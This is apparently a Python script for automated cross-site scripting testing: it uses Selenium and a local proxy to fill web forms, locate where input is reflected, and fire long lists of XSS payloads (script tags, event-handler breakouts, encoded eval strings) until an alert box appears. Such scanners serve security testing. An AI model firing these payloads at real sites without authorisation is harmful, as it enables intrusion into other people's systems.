import random
import string
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException
from selenium.common.exceptions import UnexpectedAlertPresentException
from bs4 import BeautifulSoup

# proxy information so mitmproxy can intercept the requests
proxy_host = "127.0.0.1"
proxy_port = 8080
url = sys.argv[1]
proxy = f"{proxy_host}:{proxy_port}"
options = webdriver.FirefoxOptions()
options.add_argument(f'--proxy-server={proxy}')
# launch Firefox with the configured proxy
driver = webdriver.Firefox(options=options)


def initial_form():
    # declaring variable that will be returned
    ran_input = []
    # try, except prevents code from crashing due to not finding the element and raising no such element exception
    try:
        # look for text and email inputs and textarea
        if driver.find_element(By.XPATH, "//input[@type='text']"):
            text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
            for text_input in text_inputs:
                # check if it has a pattern and is required
                if text_input.get_attribute('pattern'):
                    if text_input.get_attribute('required'):
                        print("there's a required input with a specific text pattern required")
            # otherwise generate random string and send keys
                else:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    ran_input.append(ran)
                    text_input.send_keys(ran)

        if driver.find_element(By.XPATH, '//textarea'):
            text_areas = driver.find_elements(By.XPATH, "//textarea")
            for text_area in text_areas:
                if text_area.get_attribute('pattern'):
                    if text_area.get_attribute('required'):
                        print("there's a required input with a specific text pattern required")
                else:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    ran_input.append(ran)
                    text_area.send_keys(ran)

        if driver.find_element(By.XPATH, "//input[@type='email']"):
            emails = driver.find_elements(By.XPATH, "//input[@type='email']")
            for email in emails:
                ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                ran_input.append(ran)
                email.send_keys(ran + "@gmail.com")
    except NoSuchElementException:
        pass

    # find and click button to submit form
    button = driver.find_element(By.XPATH, "//button[@type='submit']")
    button.click()
    return ran_input


def search_site(inputs):
    context = []
    # getting the html in this method includes things that were added after the page loads which page source doesn't have
    page_source = driver.execute_script("return document.documentElement.outerHTML")

    for ran in inputs:
        soup = BeautifulSoup(page_source, 'html.parser')
        # Find all instances of the target string in the HTML
        instances = soup.find_all(string=lambda text: text and ran in text)
        if not instances:
            return None
        # add the context of each instance of the string to a list
        for instance in instances:
            parent_tags = [t.name for t in instance.parents]
            if instance.find_parent("script"):
                print(f"'{url}' is located within JavaScript.")
                context.append("javascript")
            elif any([tag is not None for tag in parent_tags]):
                print(f"'{url}' is located between HTML tags.")
                context.append("between")

            else:
                print(f"'{url}' is located within an HTML tag.")
                context.append("within")
        return context


def crawl_site(inputs):
    links = []
    already_visited = []
    found_endpoint = False
    # go through evevy page on the site and see if the input is reflected there
    while not found_endpoint:
        page_links = driver.find_elements(By.XPATH, "//a[@href]")
        for link in page_links:
            if link.get_attribute("href") not in links and link.get_attribute("href") not in already_visited:
                print("adding to stack: " + link.get_attribute("href"))
                links.append(link.get_attribute("href"))
        if not links:
            return False
        next_page = links.pop()
        already_visited.append(next_page)
        driver.get(next_page)
        if search_site(inputs):
            return driver.current_url

#payloads to use
def dtr_payload(context):
  #payloads that work in between html tags
    if context == "between":
        betw_load = [
            "<img src=1 onerror=alert(1)>",
            "<script>alert(document.domain)</script>",
            "<img src=x onerror=alert(1)></img>",
            "<svg onload=alert(1)>",
            "<audio autoplay onerror=alert(1)>",
            "<video autoplay onerror=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body oninput=alert(1)><input autofocus>",
            "<svg onload=confirm(1)>",
            "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
            "<marquee><script>alert(1)</script></marquee>",
            "<details/open/ontoggle=confirm(1)>",
            "<image src=1 href=1 onerror=alert(1)>",
            "<a href=javascript:alert(1)>Click me</a>",
            "<base href='javascript:alert(1)//'>",
            "<applet code=alert(1)>",
            "<object type=text/x-scriptlet data=javascript:alert(1)></object>",
            "<b <img/src=x onerror=alert(1)></b>",
            "<plaintext onmouseover=alert(1)>",
            '<a href=\"javascript&colon;alert(1)\">Click me</a>',
            "<style>@import 'javascript:alert(1)';</style>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1);'>"
        ]
        return betw_load
  #payloads that work within html tags
    elif context == "within":
        in_load = [
            '" autofocus onfocus=alert(document.domain) x="',
            '"><script>alert(document.domain)</script>',
            '" onmouseover=alert(document.domain) x="',
            '</script><img src=1 onerror=alert(document.domain)>',
            '<img src=x onerror=alert(document.domain)>',
            '" onmouseenter=alert(1) x="',
            '" ondblclick=alert(1) x="',
            '" onload=alert(1) x="',
            'javascript:alert(1)" onmouseover=alert(document.domain) x="',
            '"><img src="x" onerror="alert(1)">',
            '" onmousemove=alert(1) x="',
            '" onmouseenter=alert(1) x="',
            '" onmousedown=alert(1) x="',
            '" onmouseout=alert(1) x="',
            '" onmouseup=alert(1) x="',
            '" onmouseleave=alert(1) x="',
            '<img onerror="alert(1)" src="x">',
            '<a onmouseover=alert(1)>',
            '" onmousemove=alert(1) x="',
            '" onmousedown=alert(1) x="',
            '" onmouseup=alert(1) x="',
            '" onmouseleave=alert(1) x="',
            '" onmouseout=alert(1) x="',
            '<img onerror=alert(1) src="x">',
            '<img onerror=alert(1) src=x>',
            '<a onmouseover=alert(1)>',
            '" onmousemove=alert(1) x="',
            '" onmousedown=alert(1) x="',
            '" onmouseup=alert(1) x="',
            '" onmouseleave=alert(1) x="',
            '" onmouseout=alert(1) x="',
            '<img onerror=alert(1) src="x">',
            '<img onerror=alert(1) src=x>',
            '<svg onload=alert(1)>',
            '<audio autoplay onerror=alert(1)>',
            '<video autoplay onerror=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body oninput=alert(1)><input autofocus>',
            '<svg onload=confirm(1)>',
            '<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>',
            '<marquee><script>alert(1)</script></marquee>',
            '<details/open/ontoggle=confirm(1)>',
            '<image src=1 href=1 onerror=alert(1)>',
            '<a href=javascript:alert(1)>Click me</a>',
            '<base href="javascript:alert(1)//">',
            '<applet code=alert(1)>',
            '<object type=text/x-scriptlet data=javascript:alert(1)></object>',
            '<b <img/src=x onerror=alert(1)></b>',
            '<plaintext onmouseover=alert(1)>',
            '<a href="javascript&colon;alert(1)">Click me</a>',
            '<style>@import \'javascript:alert(1)\';</style>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1);">',
            '" onfocus=confirm(1) x="',
            '" ondblclick=confirm(1) x="',
            '" onload=confirm(1) x="',
            '" onfocus=confirm(1) x="',
            '" onmousemove=confirm(1) x="',
            '" onmousedown=confirm(1) x="',
            '" onmouseup=confirm(1) x="',
            '" onmouseleave=confirm(1) x="',
            '" onmouseout=confirm(1) x="',
            '" onmouseenter=confirm(1) x="',
            '" onmouseover=confirm(1) x="',
            '<svg/onload=confirm(1)>',
            '<img/src=x onerror=confirm(1)>',
            '" onfocus=alert(1) x="',
            '" ondblclick=alert(1) x="',
            '" onload=alert(1) x="',
            '" onfocus=alert(1) x="',
            '" onmousemove=alert(1) x="',
            '" onmousedown=alert(1) x="',
            '" onmouseup=alert(1) x="',
            '" onmouseleave=alert(1) x="',
            '" onmouseout=alert(1) x="',
            '" onmouseenter=alert(1) x="',
            '" onmouseover=alert(1) x="',
            '" onfocus=confirm(1) x="',
            '" ondblclick=confirm(1) x="',
            '" onload=confirm(1) x="',
            '" onfocus=confirm(1) x="',
            '" onmousemove=confirm(1) x="',
            '" onmousedown=confirm(1) x="',
            '" onmouseup=confirm(1) x="',
            '" onmouseleave=confirm(1) x="',
            '" onmouseout=confirm(1) x="',
            '" onmouseenter=confirm(1) x="',
            '" onmouseover=confirm(1) x="',
            '<svg/onload=confirm(1)>',
        ]
        return in_load
      
    #payloads that work in javascript
    else:
        java_load = [
            "</script><img src=1 onerror=alert(document.domain)>",
            "'-alert(document.domain)-'",
            "';alert(document.domain)//",
            "\\';alert(document.domain)//",
            "onerror=alert;throw 1",
            "&apos;-alert(document.domain)-&apos;",
            "${alert(document.domain)}",
            "javascript:alert(1)",
            "'-alert(1)-'",
            "${alert(1)}",
            "');alert(document.domain);//",
            '"-alert(document.domain)-"',
            '";alert(document.domain);//',
            '");alert(document.domain);//',
            '`-alert(document.domain)-`',
            '`);alert(document.domain);//',
            '/**/alert(document.domain);//',
            '+alert(document.domain)//',
            '<svg onload=alert(document.domain)>',
            'String.fromCharCode(97,108,101,114,116,40,49,41)',
            'eval(String.fromCharCode(97,108,101,114,116,40,49,41))',
            'String.fromCharCode(97,108,101,114,116,40,49,41)',
            'Function("alert(document.domain)")()',
            'eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs="))',
            'eval(String.fromCharCode(118, 97, 114, 32, 99, 111, 100, 101, 32, 61, 32, 39, 97, 108, 101, 114, 116, 40, 49, 41, 59, 39, 59, 10, 101, 118, 97, 108, 40, 99, 111, 100, 101, 41, 59))',
            '<iframe src="javascript:alert(1)"></iframe>',
            'document.write("<script>alert(document.domain)</script>")',
            'eval("aler"+"t("+"document.domain"+")")',
            'Function`alert(document.domain)`',
            'String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)',
            'new Function`alert(document.domain)`',
            'new Function("alert(document.domain)")()'
        ]
        return java_load


def submit_form(payload):
    # sometimes the javascript popup doesn't get caught by is_script and only is triggered when trying to submit the next payload
    try:
        try:
            # look for text and email inputs and textarea
            if driver.find_element(By.XPATH, "//input[@type='text']"):
                text_inputs = driver.find_elements(By.XPATH, "//input[@type='text']")
                for text_input in text_inputs:
                    # check if it has a pattern and is required
                    if text_input.get_attribute('pattern'):
                        if text_input.get_attribute('required'):
                            print("there's a required input with a specific text pattern required")
                # otherwise submit the payload
                    else:
                        text_input.clear()
                        text_input.send_keys(payload)
                        print("submitting payload: " + payload)

            if driver.find_element(By.XPATH, '//textarea'):
                text_areas = driver.find_elements(By.XPATH, "//textarea")
                for text_area in text_areas:
                    if text_area.get_attribute('pattern'):
                        if text_area.get_attribute('required'):
                            print("there's a required input with a specific text pattern required")
                    else:
                        text_area.clear()
                        text_area.send_keys(payload)
                        print("submitting payload: " + payload)

            if driver.find_element(By.XPATH, "//input[@type='email']"):
                emails = driver.find_elements(By.XPATH, "//input[@type='email']")
                for email in emails:
                    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                    email.clear()
                    email.send_keys(ran + "@gmail.com")
        except NoSuchElementException:
            pass
    # javascript popup exception
    except UnexpectedAlertPresentException:
        return False

    button = driver.find_element(By.XPATH, "//button[@type='submit']")
    button.click()
    return True


def script_check():
    # check if there is a javascript alert
    try:
        if driver.switch_to.alert:
            return True
        else:
            return False
    except NoAlertPresentException:
        pass


def read_file(rands):
    contexts = []
    with open("packets.txt") as f:
        print("file opened")
        contents = f.read()
        soup = BeautifulSoup(f, 'html.parser')
        for ran in rands:
            # Find all instances of the target string in the HTML
            instances = soup.find_all(string=lambda text: text and ran in text)
            if not instances:
                return None
            # Print the context of each instance of the target string
            for instance in instances:
                parent_tags = [t.name for t in instance.parents]
                if instance.find_parent("script"):
                    contexts.append("javascript")
                elif any([tag is not None for tag in parent_tags]):
                    contexts.append("between")
                else:
                    contexts.append("within")
            return contexts


def test_payloads(contexts):
    is_script = False
    for context in contexts:
        # determine payload based on context
        use_payloads = dtr_payload(context)
        # loop through payloads until there are  either no more or xss is detected
        for use_payload in use_payloads:
            # submit form again with payload and break if there were any pop ups while trying to submit payload
            if not submit_form(use_payload):
                print("pop up detected while submitting payload")
                is_script = True
                return is_script
            # check for popup
            is_script = script_check()
            if is_script:
                print("xss vulnerability detected")
                return is_script
        if is_script:
            return is_script
    return is_script


if __name__ == "__main__":
    file = "scapyTest.py"
    driver.get(url)
    form = initial_form()
    contexts1 = search_site(form)
    contexts2 = read_file(form)
    if contexts1 or contexts2:
        if contexts1:
            test_payloads(contexts1)
        if contexts2:
            test_payloads(contexts2)
    else:
        exit_point = crawl_site(form)
        if exit_point:
            contexts1 = search_site(form)
            contexts2 = read_file(form)
            if contexts1 or contexts2:
                if contexts1:
                    test_payloads(contexts1)
                if contexts2:
                    test_payloads(contexts2)




